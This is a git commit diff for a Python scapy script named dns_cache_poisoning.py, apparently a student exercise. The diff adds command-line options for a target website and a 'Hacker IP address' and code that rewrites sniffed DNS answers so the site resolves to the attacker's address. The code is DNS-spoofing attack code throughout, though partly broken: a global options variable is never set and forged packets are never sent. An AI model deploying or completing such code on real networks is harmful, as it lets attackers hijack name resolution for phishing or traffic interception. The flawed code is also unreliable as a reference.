0a9f43dea21144ada0e27d1fb86cee3dbe8f3380
BennyTW <b04502051@g.ntu.edu.tw>
2019-05-16 23:11:19 +0800

    cache spoofing

--- dns_cache_poisoning.py
+++ dns_cache_poisoning.py
@@ -4,11 +4,19 @@
 # ----- DO NOT RUN IN PUBLIC NETWORK
 
 from scapy.all import *
-import sys
+import sys, time, datetime
 from datetime import datetime
-import time
-import datetime
+import argparse
 
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-w", "--website", dest="website",
+                        help="Target Website")
+    parser.add_argument("-i", "--ip-address", dest="ip",
+                        help="Hacker IP address")
+    opt = parser.parse_args()
+    return opt
 
 def sniffer(pkt):
     pkt_time = pkt.sprintf('%sent.time%')
@@ -16,30 +24,36 @@ def sniffer(pkt):
         if DNSQR in pkt and pkt.dport == 53:
             print('[**] Detected DNS QR Message at: ' + pkt_time)
             poisoner(pkt)
+            # pkt[IP].src = "192.168.1.1"
+            # print(pkt.show())
+
         elif DNSRR in pkt and pkt.sport == 53:
             print('[**] Detected DNS RR Message at: ' + pkt_time)
-            # print(pkt.decode())
-        # if IP in pkt:
-        #     # print("---- source : " + pkt[IP].src)
-        #     # print("---- destination : " + pkt[IP].dst)
-        #     pass
+            # print(pkt[DNS].an.show())
+
     except:
         pass
 
 def poisoner(pkt):
     #### poison = IP(src=src , dst=dst , ttl=128 )/UDP(dport=53)/DNS(rd=1 , qd=DNSQR(qname=qname ,qtype=qtype))
-    qname = pkt[DNSQR].qname.decode() 
-    src = pkt[IP].src
-    dst = pkt[IP].dst
-    dns_id = pkt.id
-    dns_packet = IP(pkt.get_payload())
-    print(dns_packet.show())
-    # if dns_packet.haslayer(DNSRR):
-    #     print(dns_packet.show())
-    pass
+    qname = pkt[DNSQR].qname.decode()
+    # dns_id = pkt.id
+    
+    if DNSRR in pkt:
+        if opt.website in qname:
+            dns_responce = DNSRR(rrname=qname, rdata=opt.ip)
+            pkt[DNS].an = dns_responce
+            pkt[DNS].ancount = 1
+
+            del pkt[IP].len
+            del pkt[IP].chksum
+            del pkt[UDP].len
+            del pkt[UDP].chksum
+            print(pkt.show())
 
 if __name__ == "__main__":
     try:
+        get_arguments()
         gate = input("[WARNING] Make Sure Selected Interface is in PRIVATE NETWORK!![yN]")
         if gate == "y" or gate == "Y":
             interface = 'wlp0s20f3'
